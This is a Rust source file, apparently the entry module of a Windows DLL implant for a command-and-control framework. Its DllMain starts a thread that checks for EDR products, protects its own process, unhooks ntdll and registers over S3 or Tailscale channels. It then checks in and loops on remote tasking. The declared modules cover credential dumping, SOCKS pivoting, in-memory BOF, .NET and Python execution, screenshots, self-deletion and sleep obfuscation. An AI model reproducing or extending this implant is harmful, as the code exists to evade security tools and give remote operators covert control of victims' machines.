#![allow(non_snake_case, non_upper_case_globals)]

mod config;
mod checkin;
mod transport;
mod s3_transport;
#[cfg(feature = "tailscale")]
mod tailscale_transport;
mod crypto;
mod tasking;
mod features {
    pub mod exit;
    pub mod pong;
    pub mod filesystem;
    pub mod upload;
    pub mod download;
    pub mod psw;
    pub mod socks;
    pub mod executeBOF;
    pub mod executeDOT;
    pub mod executePY;
    pub mod list_processes;
    pub mod pivot;
    pub mod screenshot;
    pub mod selfdelete;
    pub mod selfclone;
    pub mod loadLoader;
    pub mod sleep;
}
mod nt_mem;
mod edrcheck;
mod mem_wipe;
mod reflective_loader;
mod beacon_pack;
mod loader_cache;
mod selfprotect;
#[cfg(feature = "unhook")]
mod unhook;
#[cfg(feature = "ekko")]
mod sleep_obf;
mod worker;
mod helpers;
mod debug_log;

use std::thread;

#[no_mangle]
pub extern "system" fn DllMain(
    _hinst: *mut u8,
    reason: u32,
    _reserved: *mut u8,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;

    if reason == DLL_PROCESS_ATTACH {
        thread::spawn(|| {
            run();
        });
    }
    1
}

fn run() {
    debug_log::install_panic_hook();
    dlog!(
        "dll: start pid={} log={}",
        std::process::id(),
        debug_log::path().display()
    );

    edrcheck::gate();
    dlog!("dll: edrcheck passed");

    dlog!("dll: selfprotect begin");
    selfprotect::set_process_security_descriptor();
    dlog!("dll: selfprotect done");

    #[cfg(feature = "unhook")]
    {
        dlog!("dll: ntdll unhook begin");
        let ok = unsafe { unhook::unhook_ntdll() };
        dlog!("dll: ntdll unhook result={ok}");
    }

    helpers::startup_delay();

    #[cfg(feature = "tailscale")]
    if config::use_tailscale {
        dlog!("dll: tailscale init");
        loop {
            match tailscale_transport::init() {
                Ok(_) => {
                    dlog!("dll: tailscale ok");
                    break;
                }
                Err(e) => {
                    dlog!("dll: tailscale err: {e}");
                    helpers::idle();
                }
            }
        }
    }

    if config::use_s3 {
        dlog!("dll: s3 register");
        loop {
            match s3_transport::register() {
                Ok(_) => {
                    dlog!("dll: s3 ok");
                    break;
                }
                Err(e) => {
                    dlog!("dll: s3 err: {e}");
                    helpers::idle();
                }
            }
        }
    }

    dlog!("dll: checkin begin");
    checkin::checkin();
    dlog!("dll: checkin done uuid={}", *config::UUID.read().unwrap());

    let mut round: u64 = 0;
    loop {
        round += 1;
        dlog!("dll: tasking round={round} begin");
        if let Err(e) = tasking::getTasking() {
            dlog!("dll: tasking round={round} err: {e}");
        } else {
            dlog!("dll: tasking round={round} ok");
        }
        helpers::idle();
    }
}
